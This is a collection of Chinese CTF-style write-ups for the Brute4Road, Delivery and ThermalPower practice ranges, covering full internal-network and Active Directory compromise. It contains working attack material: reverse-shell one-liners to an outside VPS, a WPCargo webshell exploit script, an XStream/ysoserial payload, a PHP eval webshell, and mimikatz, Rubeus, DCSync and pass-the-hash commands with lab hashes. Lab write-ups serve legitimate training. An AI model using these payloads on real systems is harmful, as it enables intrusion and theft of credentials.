[{"categories":["penetration","wp"],"content":"春秋云境-Brute4Road综合渗透通关wp 靶标介绍： Brute4Road是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。 ","date":"2025-02-18","objectID":"/chunqiuyunjing-brute4road/:0:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-Brute4Road综合渗透","uri":"/chunqiuyunjing-brute4road/#"},{"categories":["penetration","wp"],"content":"\rflag01起手fscan E:\\Tools\\web\\fscan_1.8.4\u003efscan.exe -h 39.99.144.164 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4 start infoscan 39.99.144.164:21 open 39.99.144.164:22 open 39.99.144.164:80 open 39.99.144.164:6379 open [*] alive ports len is: 4 start vulscan [*] WebTitle http://39.99.144.164 code:200 len:4833 title:Welcome to CentOS [+] ftp 39.99.144.164:21:anonymous [-\u003e]pub [+] Redis 39.99.144.164:6379 unauthorized file:/usr/local/redis/db/dump.rdb 已完成 4/4 发现redis Redis系列漏洞总结 - FreeBuf网络安全行业门户 尝试写计划任务反弹shell，提示权限不够 set xz \"\\n* * * * * bash -i \u003e\u0026 /dev/tcp/39.106.75.37/9999 0\u003e\u00261\\n\" ​ Redis 主从复制RCE n0b0dyCN/redis-rogue-server: Redis(\u003c=5.0.5) RCE （主从复制极有可能把靶机打崩，因此我们利用成功之后若是不小心退出了shell，只能重启环境。） python3 redis-rogue-server.py --rhost 39.99.144.164 --lhost 39.106.75.37 --lport 6666 ​ vps拿到shell之后创建一个伪终端 python -c 'import pty; pty.spawn(\"/bin/bash\")' ​ 找到flag，权限不够，尝试suid提权 ​ find / -perm -u=s -type f 2\u003e/dev/null ​ 发现base64可利用 base64 \"/home/redis/flag/flag01\" | base64 --decode ​ ","date":"2025-02-18","objectID":"/chunqiuyunjing-brute4road/:1:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-Brute4Road综合渗透","uri":"/chunqiuyunjing-brute4road/#flag01"},{"categories":["penetration","wp"],"content":"\rflag02搜集信息，ifconfig发现没有该命令 使用netstat -antp​ ​ 上传fscan frpc frpc.ini到靶机 [redis@centos-web01 tmp]$ ./fscan -h 172.22.2.7/24 ./fscan -h 172.22.2.7/24 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4 start infoscan trying RunIcmp2 The current user permissions unable to send icmp packets start ping (icmp) Target 172.22.2.3 is alive (icmp) Target 172.22.2.16 is alive (icmp) Target 172.22.2.7 is alive (icmp) Target 172.22.2.34 is alive (icmp) Target 172.22.2.18 is alive [*] Icmp alive hosts len is: 5 172.22.2.3:135 open 172.22.2.18:80 open 172.22.2.16:80 open 172.22.2.18:22 open 172.22.2.7:80 open 172.22.2.7:22 open 172.22.2.7:21 open 172.22.2.3:88 open 172.22.2.7:6379 open 172.22.2.16:1433 open 172.22.2.18:445 open 172.22.2.34:445 open 172.22.2.3:445 open 172.22.2.18:139 open 172.22.2.16:139 open 172.22.2.34:139 open 172.22.2.3:139 open 172.22.2.34:135 open 172.22.2.16:135 open 172.22.2.16:445 open [*] alive ports len is: 20 start vulscan [*] NetInfo [*]172.22.2.16 [-\u003e]MSSQLSERVER [-\u003e]172.22.2.16 [*] NetBios 172.22.2.34 XIAORANG\\CLIENT01 [*] NetInfo [*]172.22.2.3 [-\u003e]DC [-\u003e]172.22.2.3 [*] WebTitle http://172.22.2.7 code:200 len:4833 title:Welcome to CentOS [*] WebTitle http://172.22.2.16 code:404 len:315 title:Not Found [*] NetInfo [*]172.22.2.34 [-\u003e]CLIENT01 [-\u003e]172.22.2.34 [*] NetBios 172.22.2.3 [+] DC:DC.xiaorang.lab Windows Server 2016 Datacenter 14393 [*] OsInfo 172.22.2.16 (Windows Server 2016 Datacenter 14393) [*] NetBios 172.22.2.16 MSSQLSERVER.xiaorang.lab Windows Server 2016 Datacenter 14393 [*] NetBios 172.22.2.18 WORKGROUP\\UBUNTU-WEB02 [*] OsInfo 172.22.2.3 (Windows Server 2016 Datacenter 14393) [+] ftp 172.22.2.7:21:anonymous [-\u003e]pub [*] WebTitle http://172.22.2.18 code:200 len:57738 title:又一个WordPress站点 已完成 20/20 上frp转发流量 nohup ./frpc -c ./frpc.ini \u003e/dev/null 2\u003e\u00261 \u0026 ​ 发现有wordpress，用wpscan扫一下 wpscan --url http://172.22.2.18 发现版本过低 ​ WPCargo \u003c 6.9.0 – Unauthenticated RCE | CVE 2021-25003 | Plugin Vulnerabilities 直接打exp import sys import binascii import requests # This is a magic string that when treated as pixels and compressed using the png # algorithm, will cause \u003c?=$_GET[1]($_POST[2]);?\u003e to be written to the png file payload = '2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50' def encode_character_code(c: int): return '{:08b}'.format(c).replace('0', 'x') text = ''.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:] destination_url = 'http://172.22.2.18/' cmd = 'ls' # With 1/11 scale, '1's will be encoded as single white pixels, 'x's as single black pixels. requests.get( f\"{destination_url}wp-content/plugins/wpcargo/includes/barcode.php?text={text}\u0026sizefactor=.090909090909\u0026size=1\u0026filepath=/var/www/html/webshell.php\" ) # We have uploaded a webshell - now let's use it to execute a command. print(requests.post( f\"{destination_url}webshell.php?1=system\", data={\"2\": cmd} ).content.decode('ascii', 'ignore')) 蚁剑连接，类型要选cmdlinux ​ 在config文件内发现数据库账号密码 ​ 连一下数据库，拿到flag02 ​ ","date":"2025-02-18","objectID":"/chunqiuyunjing-brute4road/:2:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-Brute4Road综合渗透","uri":"/chunqiuyunjing-brute4road/#flag02"},{"categories":["penetration","wp"],"content":"\rflag03有相关提示 ​ 发现内网还有个主机开启1433端口，导出过口令，尝试数据库爆破。 ​ 使用MDUT连过去 sa/ElGNkOiC 上传SweetPotato提权 ​ 提权读取flag03 ​ ","date":"2025-02-18","objectID":"/chunqiuyunjing-brute4road/:3:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-Brute4Road综合渗透","uri":"/chunqiuyunjing-brute4road/#flag03"},{"categories":["penetration","wp"],"content":"\rflag04发现3389端口是开着的 ​ 创建用户，rdp连过去 C:/迅雷下载/sweetpotato.exe -a \"net user test qwer1234! /add\" C:/迅雷下载/sweetpotato.exe -a \"net localgroup administrators test /add\" 查看一下信息 systeminfo ​ 使用BloodHound分析域关系 ​ 上传猕猴桃 mimikatz.exe privilege::debug sekurlsa::logonpasswords ​ 拿到MSSQLSERVER$的NTML f76585e4daca31b783b926e97e03439c 可以尝试委派攻击 上传Rubeus.exe .\\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:f76585e4daca31b783b926e97e03439c /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap \u003e res.txt ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.2.3 [*] Action: S4U [*] Using rc4_hmac hash: 7e0afdd74f437da621b7b205a61781e1 [*] Building AS-REQ (w/ preauth) for: 'xiaorang.lab\\MSSQLSERVER$' [*] Using domain controller: 172.22.2.3:88 [+] TGT request successful! [*] base64(ticket.kirbi): doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE3lkC6JQjHfRCcji5EMsY39Dv/i2//jnIfAkQSjQ1OHlel3r4Wh+lg/u7jAgirmDe18ZnnkVv0it5WM8dNAN6rTYBXP/AxGVuWQWU63EDmtmlXsDmSrSqILnJ+2MZUl2pwX69KQDRJOB5ewy7AW3sPI0JmmJjkVrD98D+UgEqw1XX2xzBiylC2PNPGnqkSm6FA+Itgj2s6KsGITu5uYP9E6dT0Tnv3MzeQMq19/0WoHmy7sNQxgTDLr3hM5za/hE2VxZfijuIA4mZYV+2Uk998xNPgDstAqA22dB5aEnvOYQyIL1cRGE9vJtlc9R0o97tedCTQlu+PyGwsoQsNVx+rbJrSL+CXA9SDPjaULYlJtTZn8PfWUUpWfyU/MjIPQb+l75+lnZmh0rxDRVmQjYJKTVARTmMz+YZ4rV9P+RUNTYBGvZkg65kCT7m4/EGKtNW9zTLAKF3rRX1lgqB9NlVhPCp4gBZxTvzxY+3li6g62NNmwduFFvSpcH4pN+Ra4dIUXF26VlBsxPFU9j0UIOl4UwojwEWQ9IP1gCzH0Xv8MwMsLjeSZhAYoMVObFisd7JSiG31jA4v90BD5JCcYq58xHcUSCf6/k/dvYV6wVMTUSfjrzeQ8Cb1vlxoORgaRNrKT8Jrv8AilqBLwJ/VMMrI5CI9gf4wbfHMObuVe0ekw6Ep2Ef/uBSlpN9kq9UEHNGitAsQzyeIIjxNX5bF+uFRV3j9zawgcEDSA62B+YiCDhe2Kh3cZgM7oDXoy9CPUuW1J2tSv6v6I6j/LMStZtXqnem8aLlSEHUL1p3NWP5CTtJTHlICfxihKcQQbJHtjMePimaSyWUq/gsleaDfty6s+Cv87Gg2ycaZEkep5tbzxz/BLMRzvq4weZdm4Iqee9kWt0uPhBPjDTw2qHLqdxOEhbSKS+wD6JNvN+xJJEe/g7cJL9ndstjKDxD6K6IvW1UMwsdGgn2Zx62Q2yvUG1M/cXpMkAYAVaAjNSkdO8lfgMKrOTU+bz6AM9u5GupaUrzII0tcOlN8gcYv7Pcwsw7F+4GWokEJ/NW5Y0jmcsn+Azi5w3V+VgPBw5FtHCEfoaU+EupxVUnqJSJbq3VrZK/NbV4AZXSY3gYwpqMc4cew5jYI1G1iL8aHiNxcVtdCwQ5wAQoDwJBkr/czCt3PVQaR6V1rSx9ds4hUG1FZHVBy8JVv0oFQQxsx22NB2Tb6aeaSsRQmHMSO94BAl5ChO492PwCQnR7vTzUcjI55zXcnmzEdKgN0I4HsjeTVq7gD4iELF2wJLABQSGJl+MyBms0yyyBXsVr6I6Ex06BUqADgCEX8JskIdlxyJuegtv2JT3gb98cZ0dut9e+ym5Y4w/CslV59lmrq/mX3I7Ki+uKbu1qcK94fSAnRjlLRUjranhKAheVGDVW2AjHbmvW8oN8rEPri3lJ4UGHtJH2WfuHnjcliz2773vyYFwbNhGtqjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBA8maMBmJBiqwedjqcg2RbdoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDIzMDcyNDA5NDEwN1qmERgPMjAyMzA3MjQxOTQxMDdapxEYDzIwMjMwNzMxMDk0MTA3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg== [*] Action: S4U [*] Building S4U2self request for: 'MSSQLSERVER$@XIAORANG.LAB' [*] Using domain controller: DC.xiaorang.lab (172.22.2.3) [*] Sending S4U2self request to 172.22.2.3:88 [+] S4U2self success! [*] Got a TGS for 'Administrator' to 'MSSQLSERVER$@XIAORANG.LAB' [*] base64(ticket.kirbi): doIF3DCCBdigAwIBBaEDAgEWooIE5DCCBOBhggTcMIIE2KADAgEFoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKOCBKQwggSgoAMCARKhAwIBAqKCBJIEggSOQk0zg8ppwwk/iV4OPzoKxGIrT5bV9o5LO9YdFQVcvQZM+P9/0ukplP962xywAP9iDmhLXdz8OEHMuCC0iUHXq4i9Axa9VKZkNbigEg1KyMcZMFADLpXm4aSTvjnHOLKryuH+ACFLL80Roj6JXP2Rx8cpxBaQFbrViV9PmzyXE0D6/B/DfPOII+ON+6aC5TCkjS841xGr6JIrZ1IVXMreSp6y3Sa0+Ac1Jk+j+XC2JqyBaCKInt5UArLHddcDD+Ac6VrZhJdcuDcw37SsiCAhwn3V/eML9XXbvam6cB++Xsx2D/mMIdH5nqhDPNzJx5iaJkaWkVWvcYlLhQmboyd6mKsHw7CuJ41G9dJh8kDSdEsg1T5ZOef+oelAO7zIHcAvKon9XS0UA9+I5uKWNMsUqUluAOW6VIQnhbe400NS7xbIoAfc6Os0ap1tUAtXWVNp6RGnUsFVmPpE2pwKddOuFV2c0D0wrk+m6yYop8SDeWLsOzgOT7NggwnVwpgXcqRtZN6oQYJppwKNILtg5t+H0gvdDiABHOdMTNoYTnJ5zFybmX02WuSgtOsVLhEnchBgybaGaO4XlYPk7XXeOntg0mA/4qoFB83N0zfkYDyvEFWvlsyiOS1xVTiUGS4HFnauxGmWztsIt9OoRt57XlsEuI64zXLq0/WU4neNb3l4cuTmnSdl/su4wbwDizJmI/MpOTI34nIFJE7ZXgcXnJtjomNpbZeBmo6Ok39+Iww2uIMmXDK3cLtPi","date":"2025-02-18","objectID":"/chunqiuyunjing-brute4road/:4:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-Brute4Road综合渗透","uri":"/chunqiuyunjing-brute4road/#flag04"},{"categories":["penetration","wp"],"content":"春秋云境-Delivery综合渗透通关wp 靶标介绍： 在这个靶场中，您将扮演一名渗透测试工程师，受雇于一家名为 Delivery 的小型科技初创公司，并对该公司进行一次渗透测试。你的目标是成功获取域控制器权限，以评估公司的网络安全状况。该靶场共有 4 个 Flag，分布于不同的靶机。 ","date":"2025-02-17","objectID":"/chunqiuyunjing-delivery/:0:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-Delivery综合渗透","uri":"/chunqiuyunjing-delivery/#"},{"categories":["penetration","wp"],"content":"\rflag01 关卡剧情：请测试 Delivery 暴露在公网上的 Web 应用的安全性，并尝试获取在该服务器上执行任意命令的能力。 起手fscan E:\\Tools\\web\\fscan_1.8.4\u003efscan.exe -h 39.99.144.189 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4 start infoscan 39.99.144.189:21 open 39.99.144.189:8080 open 39.99.144.189:22 open 39.99.144.189:80 open [*] alive ports len is: 4 start vulscan [*] WebTitle http://39.99.144.189 code:200 len:10918 title:Apache2 Ubuntu Default Page: It works [+] ftp 39.99.144.189:21:anonymous [-\u003e]1.txt [-\u003e]pom.xml [*] WebTitle http://39.99.144.189:8080 code:200 len:3655 title:公司发货单 已完成 4/4 发现了一个匿名ftp和一个web 先把ftp文件下载下来 在pox.xml里发现了 版本在1.4.16的xstream 这个版本是有个反序列化漏洞的 ​ http://39.99.144.189:8080是一个web页面 抓包看一下，发现是xml格式传输 ​ CVE-2021-29505 配合 CommonsCollections的链子即可拿到shell 用ysoserial 选择 CommonsCollections6链子即可反弹成功 在vps上使用ysoserial的JRMPListener启动一个恶意的RMI Registry： java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS4xMDYuNzUuMzcvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}\" 发包，打payload POST /just_sumbit_it HTTP/1.1 Host: 39.99.159.98:8080 Content-Length: 3119 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Accept: application/xml, text/xml, */*; q=0.01 Content-Type: application/xml;charset=UTF-8 Origin: http://39.99.159.98:8080 Referer: http://39.99.159.98:8080/ Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Connection: close \u003cjava.util.PriorityQueue serialization='custom'\u003e \u003cunserializable-parents/\u003e \u003cjava.util.PriorityQueue\u003e \u003cdefault\u003e \u003csize\u003e2\u003c/size\u003e \u003c/default\u003e \u003cint\u003e3\u003c/int\u003e \u003cjavax.naming.ldap.Rdn_-RdnEntry\u003e \u003ctype\u003e12345\u003c/type\u003e \u003cvalue class='com.sun.org.apache.xpath.internal.objects.XString'\u003e \u003cm__obj class='string'\u003ecom.sun.xml.internal.ws.api.message.Packet@2002fc1d Content\u003c/m__obj\u003e \u003c/value\u003e \u003c/javax.naming.ldap.Rdn_-RdnEntry\u003e \u003cjavax.naming.ldap.Rdn_-RdnEntry\u003e \u003ctype\u003e12345\u003c/type\u003e \u003cvalue class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'\u003e \u003cmessage class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'\u003e \u003cparsedMessage\u003etrue\u003c/parsedMessage\u003e \u003csoapVersion\u003eSOAP_11\u003c/soapVersion\u003e \u003cbodyParts/\u003e \u003csm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'\u003e \u003cattachmentsInitialized\u003efalse\u003c/attachmentsInitialized\u003e \u003cnullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'\u003e \u003caliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'\u003e \u003ccandidates class='com.sun.jndi.rmi.registry.BindingEnumeration'\u003e \u003cnames\u003e \u003cstring\u003eaa\u003c/string\u003e \u003cstring\u003eaa\u003c/string\u003e \u003c/names\u003e \u003cctx\u003e \u003cenvironment/\u003e \u003cregistry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'\u003e \u003cjava.rmi.server.RemoteObject\u003e \u003cstring\u003eUnicastRef\u003c/string\u003e \u003cstring\u003e39.106.75.37\u003c/string\u003e \u003cint\u003e1099\u003c/int\u003e \u003clong\u003e0\u003c/long\u003e \u003cint\u003e0\u003c/int\u003e \u003clong\u003e0\u003c/long\u003e \u003cshort\u003e0\u003c/short\u003e \u003cboolean\u003efalse\u003c/boolean\u003e \u003c/java.rmi.server.RemoteObject\u003e \u003c/registry\u003e \u003chost\u003e39.106.75.37\u003c/host\u003e \u003cport\u003e1099\u003c/port\u003e \u003c/ctx\u003e \u003c/candidates\u003e \u003c/aliases\u003e \u003c/nullIter\u003e \u003c/sm\u003e \u003c/message\u003e \u003c/value\u003e \u003c/javax.naming.ldap.Rdn_-RdnEntry\u003e \u003c/java.util.PriorityQueue\u003e \u003c/java.util.PriorityQueue\u003e ‍ ​ 再起一个9999端口的监听 nc -lvvp 9999 ​ 读flag ​ ","date":"2025-02-17","objectID":"/chunqiuyunjing-delivery/:1:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-Delivery综合渗透","uri":"/chunqiuyunjing-delivery/#flag01"},{"categories":["penetration","wp"],"content":"\rflag02 关卡剧情：为了实现跨机器和跨操作系统的文件共享，管理员在内网部署了 NFS，然而这个决策却使得该服务器陷入了潜在的安全风险。你的任务是尝试获取该服务器的控制权，以评估安全性。 ifconfig eth0: flags=4163\u003cUP,BROADCAST,RUNNING,MULTICAST\u003e mtu 1500 inet 172.22.13.14 netmask 255.255.0.0 broadcast 172.22.255.255 inet6 fe80::216:3eff:fe0a:9ba5 prefixlen 64 scopeid 0x20\u003clink\u003e ether 00:16:3e:0a:9b:a5 txqueuelen 1000 (Ethernet) RX packets 91569 bytes 123849696 (123.8 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 26861 bytes 3630089 (3.6 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u003cUP,LOOPBACK,RUNNING\u003e mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10\u003chost\u003e loop txqueuelen 1000 (Local Loopback) RX packets 512 bytes 44515 (44.5 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 512 bytes 44515 (44.5 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 上传fscan并扫描 root@ubuntu:/# ./fscan -h 172.22.13.14/24 ./fscan -h 172.22.13.14/24 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4 start infoscan (icmp) Target 172.22.13.14 is alive (icmp) Target 172.22.13.6 is alive (icmp) Target 172.22.13.28 is alive (icmp) Target 172.22.13.57 is alive [*] Icmp alive hosts len is: 4 172.22.13.28:3306 open 172.22.13.28:445 open 172.22.13.6:88 open 172.22.13.6:445 open 172.22.13.28:139 open 172.22.13.6:139 open 172.22.13.6:135 open 172.22.13.14:21 open 172.22.13.28:80 open 172.22.13.57:80 open 172.22.13.57:22 open 172.22.13.14:80 open 172.22.13.14:22 open 172.22.13.28:135 open 172.22.13.14:8080 open 172.22.13.28:8000 open [*] alive ports len is: 16 start vulscan [*] WebTitle http://172.22.13.14 code:200 len:10918 title:Apache2 Ubuntu Default Page: It works [*] NetInfo [*]172.22.13.6 [-\u003e]WIN-DC [-\u003e]172.22.13.6 [*] NetInfo [*]172.22.13.28 [-\u003e]WIN-HAUWOLAO [-\u003e]172.22.13.28 [*] WebTitle http://172.22.13.57 code:200 len:4833 title:Welcome to CentOS [*] WebTitle http://172.22.13.28 code:200 len:2525 title:欢迎登录OA办公平台 [*] NetBios 172.22.13.6 [+] DC:XIAORANG\\WIN-DC [*] NetBios 172.22.13.28 WIN-HAUWOLAO.xiaorang.lab Windows Server 2016 Datacenter 14393 [+] ftp 172.22.13.14:21:anonymous [-\u003e]1.txt [-\u003e]pom.xml [*] WebTitle http://172.22.13.28:8000 code:200 len:170 title:Nothing Here. [*] WebTitle http://172.22.13.14:8080 code:200 len:3655 title:公司发货单 [+] mysql:172.22.13.28:3306:root 123456 已完成 16/16 第二关提示有nfs，扫描一下2049端口 root@ubuntu:/# ./fscan -h 172.22.13.0/24 -p 2049 ./fscan -h 172.22.13.0/24 -p 2049 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4 start infoscan (icmp) Target 172.22.13.14 is alive (icmp) Target 172.22.13.6 is alive (icmp) Target 172.22.13.28 is alive (icmp) Target 172.22.13.57 is alive [*] Icmp alive hosts len is: 4 172.22.13.57:2049 open [*] alive ports len is: 1 start vulscan 已完成 1/1 [*] 扫描结束,耗时: 3.008347518s 查看匿名nfs文件列表 showmount -e 172.22.13.57 靶机上下载nfs_offline wget http://archive.ubuntu.com/ubuntu/pool/main/n/nfs-utils/nfs-common_1.3.4-2.5ubuntu3_amd64.deb wget http://archive.ubuntu.com/ubuntu/pool/main/libn/libnfsidmap/libnfsidmap2_0.25-5.1ubuntu1_amd64.deb wget http://archive.ubuntu.com/ubuntu/pool/main/libt/libtirpc/libtirpc3_1.2.5-1_amd64.deb wget http://archive.ubuntu.com/ubuntu/pool/main/r/rpcbind/rpcbind_1.2.5-8_amd64.deb wget http://archive.ubuntu.com/ubuntu/pool/main/k/keyutils/keyutils_1.6-6ubuntu1_amd64.deb wget http://archive.ubuntu.com/ubuntu/pool/main/libt/libtirpc/libtirpc-common_1.2.5-1_all.deb sudo dpkg -i libnfsidmap2_0.25-5.1ubuntu1_amd64.deb \u0026\u0026 \\ sudo dpkg -i libtirpc-common_1.2.5-1_all.deb \u0026\u0026 \\ sudo dpkg -i libtirpc3_1.2.5-1_amd64.deb \u0026\u0026 \\ sudo dpkg -i rpcbind_1.2.5-8_amd64.deb \u0026\u0026 \\ sudo dpkg -i keyutils_1.6-6ubuntu1_amd64.deb \u0026\u0026 \\ sudo dpkg -i nfs-common_1.3.4-2.5ubuntu3_amd64.deb 随后 showmount -e 172.22.13.57 ​ mkdir temp mount -t nfs 172.22.13.57:/ ./temp -o nolock 写入ssh公钥 ss","date":"2025-02-17","objectID":"/chunqiuyunjing-delivery/:2:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-Delivery综合渗透","uri":"/chunqiuyunjing-delivery/#flag02"},{"categories":["penetration","wp"],"content":"\rflag03 关卡剧情：请尝试获取内网中运行 OA 系统的服务器权限，并获取该服务器上的机密文件。 在172.22.13.14后台起一下fprc ./frpc -c ./frpc.ini \u0026 vps起frps ./frps -c ./frps.ini 配好proxifier规则 在本机用navicat连一下数据库 ​ 测试一下，发现可以读文件 select load_file('C://windows//win.ini'); ​ 直接读flag select load_file('C:\\\\users\\\\administrator\\\\flag\\\\flag03.txt'); ​ ","date":"2025-02-17","objectID":"/chunqiuyunjing-delivery/:3:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-Delivery综合渗透","uri":"/chunqiuyunjing-delivery/#flag03"},{"categories":["penetration","wp"],"content":"\rflag04 关卡剧情：由于域管理员错误的配置，导致域内某个用户拥有危险的 DACL。你的任务是找到该用户，并评估这个配置错误所带来的潜在危害。 mysql的机器也是dc机，尝试把文件导入到web路径下getshell mysql\u003e SET GLOBAL general_log='on'; mysql\u003e SET GLOBAL general_log_file='C:\\\\phpstudy_pro\\\\WWW\\\\1.php'; mysql\u003e SELECT '\u003c?php @eval($_POST[1]);?\u003e'; ​ 蚁剑连接 ​ 修改下管理员密码，远程上去 ​ rdp连过去 上传猕猴桃抓下密码 privilege::debug sekurlsa::logonpasswords ​ 拿到了chenglei的密码 * Username : chenglei * Domain : XIAORANG.LAB * Password : Xt61f3LBhg1 抓到机器用户的NTLM哈希 ​ 打pth拿到SYSTEM sekurlsa::pth /user:WIN-HAUWOLAO$ /domain:XIAORANG.LAB /ntlm:e1fc593b8d8e0be2cc96407da1eba4a5 在kali上使用BloodHound搜集一下信息 账号和密码是之前读的pAss.txt bloodhound-python -u zhangwen -p 'QT62f3gBhK1' -d xiaorang.lab -c all -ns 172.22.13.6 --zip --dns-tcp 分析一下chenglei的权限 ​ chenglei 属于 ACL ADMIN 组，ACL Admins 组对 WIN-DC 具有 WriteDacl 权限，那么可以直接写 DCSync / RBCD / Shadow Credentials ​ WriteDacl 写 RBCD https://github.com/fortra/impacket​ 在kali： python dacledit.py xiaorang.lab/chenglei -hashes :0c00801c30594a1b8eaa889d237c5382 -action write -rights DCSync -principal chenglei -target-dn 'DC=xiaorang,DC=lab' -dc-ip 172.22.13.6 用之前抓到的 ntml 修改 acl，让他拥有 DCSync 权限 利用 DCSync 导出域控的凭据 python3 secretsdump.py xiaorang.lab/chenglei@172.22.13.6 -hashes :0c00801c30594a1b8eaa889d237c5382 -just-dc-user administrator ‍ Administrator:500:aad3b435b51404eeaad3b435b51404ee:6341235defdaed66fb7b682665752c9a::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:d0f9c9b1bea5b90f9547952d2009bda6e1aab23ff2862bf9afb2be793709f0cd Administrator:aes128-cts-hmac-sha1-96:afeaadd6987386ed1e8938fb9e167e6c Administrator:des-cbc-md5:cb584c08e308a4ae ‍ 然后 PTH 拿到 flag python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:6341235defdaed66fb7b682665752c9a administrator@172.22.13.6 ‍ type C:\\Users\\Administrator\\flag\\flag04.txt ​ ‍ ‍ ","date":"2025-02-17","objectID":"/chunqiuyunjing-delivery/:4:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-Delivery综合渗透","uri":"/chunqiuyunjing-delivery/#flag04"},{"categories":["penetration","wp"],"content":"春秋云境-ThermalPower综合渗透通关wp 靶标介绍：该场景模拟仿真了电力生产企业的部分业务场景。“火创能源” 公司在未充分重视网络安全的威胁的情况下，将敏感区域的服务错误地配置在公网上，使得外部的 APT 组织可以轻松地访问这些服务，最终导致控制电力分配、生产流程和其他关键设备的服务遭受攻击，并部署了勒索病毒。 玩家的任务是分析 APT 组织的渗透行为，按照关卡列表恢复其攻击路径，并对勒索病毒加密的文件进行解密。 附件地址：https://pan.baidu.com/s/13jTP6jWi6tLWkbyO8SQSnQ?pwd=kj6h ","date":"2025-01-26","objectID":"/chunqiuyunjing-thermalpower/:0:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-ThermalPower综合渗透","uri":"/chunqiuyunjing-thermalpower/#"},{"categories":["penetration","wp"],"content":"\r外网打点","date":"2025-01-26","objectID":"/chunqiuyunjing-thermalpower/:1:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-ThermalPower综合渗透","uri":"/chunqiuyunjing-thermalpower/#外网打点"},{"categories":["penetration","wp"],"content":"\r第一关关卡剧情：评估暴露在公网的服务的安全性，尝试建立通向生产区的立足点。 起手fscan E:\\Tools\\web\\fscan_1.8.4\u003efscan.exe -h 39.98.113.46 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4 start infoscan 39.98.113.46:8080 open 39.98.113.46:22 open [*] alive ports len is: 2 start vulscan [*] WebTitle http://39.98.113.46:8080 code:302 len:0 title:None 跳转url: 